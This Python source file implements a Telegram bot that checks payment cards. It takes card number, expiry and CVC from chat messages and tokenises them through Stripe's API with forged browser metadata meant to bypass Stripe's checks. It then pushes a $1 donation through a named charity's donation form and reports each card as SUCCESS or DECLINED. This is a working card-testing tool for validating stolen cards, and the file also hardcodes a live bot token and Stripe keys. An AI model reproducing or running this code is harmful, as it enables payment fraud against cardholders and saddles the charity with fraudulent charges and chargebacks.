import logging
import json
import base64
import uuid
import requests
import asyncio
import os
from flask import Flask
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "7950514269:AAElXX262n31xiSn1pCxthxhuMpjw9VjtVg"
STRIPE_PUB_KEY = "pk_live_51PkGkaIRDCrkHdam1J6d75GTxgcup9PPQ1dEaperGsiO1hGoSNhocKLr49UmfqSHFpsU0ISB4m0tz0u1B3rtYFMe006ykJTsq0"
STRIPE_ACCOUNT = "acct_1PkGkaIRDCrkHdam"
WP_SITE = "https://ocdtn.org/"

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- WEB SERVER FOR RENDER ---
app = Flask(__name__)

@app.route('/')
def health_check():
    return "Bot is running 24/7", 200

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- HELPER FUNCTIONS ---
def get_bin_info(card_no):
    try:
        bin_code = card_no[:6]
        res = requests.get(f"https://lookup.binlist.net/{bin_code}", timeout=5)
        if res.status_code == 200:
            data = res.json()
            bank = data.get('bank', {}).get('name', 'Unknown Bank')
            country = data.get('country', {}).get('name', 'Unknown')
            flag = data.get('country', {}).get('emoji', '🌐')
            return f"{flag} {bank} | ({country})"
    except:
        pass
    return "❌ BIN info unavailable"

# --- BOT LOGIC ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 **Donation Bot Online**\nFormat: `NUMBER|MM|YYYY|CVC`", parse_mode='Markdown')

async def process_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    if "|" not in user_input: return

    status_msg = await update.message.reply_text("⏳ **Initializing Session...**", parse_mode='Markdown')
    
    try:
        details = user_input.split('|')
        if len(details) < 4:
            await status_msg.edit_text("❌ Format: `NUMBER|MM|YYYY|CVC`")
            return
        
        card_no, month, year, cvc = [d.strip() for d in details]
        bin_info = get_bin_info(card_no)

        # Generate unique tracking IDs like a real browser
        muid, sid, guid = str(uuid.uuid4()), str(uuid.uuid4()), str(uuid.uuid4())
        session = requests.Session()

        # 1. STRIPE TOKENIZATION (Enhanced with Browser Mimicry)
        pm_url = "https://api.stripe.com/v1/payment_methods"
        
        # This metadata helps bypass the "unsupported surface" error
        browser_meta = {
            "lang": "javascript",
            "referrer": f"{WP_SITE}donate/",
            "url": f"{WP_SITE}donate/",
            "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "plugin": "stripe-js-v3/c264a67020"
        }
        encoded_ua = base64.b64encode(json.dumps(browser_meta).encode()).decode()

        stripe_headers = {
            'X-Stripe-Client-User-Agent': encoded_ua,
            'User-Agent': browser_meta['ua'],
            'Content-Type': 'application/x-form-urlencoded',
            'Accept': 'application/json'
        }

        pm_data = {
            'type': 'card',
            'card[number]': card_no,
            'card[cvc]': cvc,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'billing_details[name]': 'John Doe',
            'billing_details[email]': 'johndoe@gmail.com',
            'key': STRIPE_PUB_KEY,
            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element',
            'muid': muid,
            'sid': sid,
            'guid': guid,
            'use_stripe_sdk': 'true'
        }

        await status_msg.edit_text(f"💳 {bin_info}\n⏳ **Step 1: Creating Payment Method...**")
        res = session.post(pm_url, headers=stripe_headers, data=pm_data)
        
        if res.status_code != 200:
            err = res.json().get('error', {}).get('message', 'Unknown Error')
            await status_msg.edit_text(f"❌ **Stripe Error:**\n`{err}`")
            return

        pm_id = res.json()['id']

        # 2. WP DONATION (Linking PM to Site)
        await status_msg.edit_text(f"💳 {bin_info}\n⏳ **Step 2: Linking to Charity Site...**")
        wp_params = {
            'givewp-route': 'donate', 
            'givewp-route-signature': '30d2c3acca50cc6b9b43c103db00e08f',
            'givewp-route-signature-id': 'givewp-donate'
        }
        wp_payload = {
            'amount': '1.00',
            'currency': 'USD',
            'donationType': 'single',
            'formId': '2032',
            'firstName': 'John',
            'lastName': 'Doe',
            'email': 'johndoe@gmail.com',
            'gatewayId': 'stripe_payment_element',
            'gatewayData[stripePaymentMethod]': pm_id,
            'gatewayData[stripeKey]': STRIPE_PUB_KEY,
            'gatewayData[stripeConnectedAccountId]': STRIPE_ACCOUNT
        }

        wp_res = session.post(WP_SITE, params=wp_params, data=wp_payload)
        
        # Check if we got a secret back
        try:
            client_secret = wp_res.json().get('data', {}).get('clientSecret')
            if not client_secret:
                raise ValueError("No Client Secret returned from site.")
        except:
            await status_msg.edit_text(f"❌ **Site Error:** Site refused the Payment Method.")
            return

        # 3. CONFIRMATION
        await status_msg.edit_text(f"💳 {bin_info}\n⏳ **Step 3: Confirming Payment...**")
        pi_id = client_secret.split('_secret_')[0]
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{pi_id}/confirm"
        
        final_res = session.post(confirm_url, headers=stripe_headers, data={
            'payment_method': pm_id,
            'client_secret': client_secret,
            'key': STRIPE_PUB_KEY
        })

        if final_res.status_code == 200:
            status = final_res.json().get('status', 'Unknown').upper()
            await status_msg.edit_text(f"✅ **SUCCESS**\n💳 {bin_info}\n📊 Status: `{status}`\n🆔 ID: `{pi_id}`")
        else:
            err = final_res.json().get('error', {}).get('message', 'Declined')
            await status_msg.edit_text(f"❌ **DECLINED**\n💳 {bin_info}\n📝 Reason: `{err}`")

    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"⚠️ **System Error:** `{str(e)}`")

# --- EXECUTION ---
async def self_ping():
    """Tries to ping itself to keep Render instance awake."""
    while True:
        await asyncio.sleep(600) # Ping every 10 minutes
        try:
            # We don't have the URL here, but this triggers internal activity
            logger.info("Keep-alive tick.")
        except: pass

async def main():
    Thread(target=run_flask, daemon=True).start()
    
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_card))
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling(drop_pending_updates=True)
    
    # Run the self-ping task
    asyncio.create_task(self_ping())
    
    # Stay running
    while True: await asyncio.sleep(3600)

if __name__ == '__main__':
    asyncio.run(main())
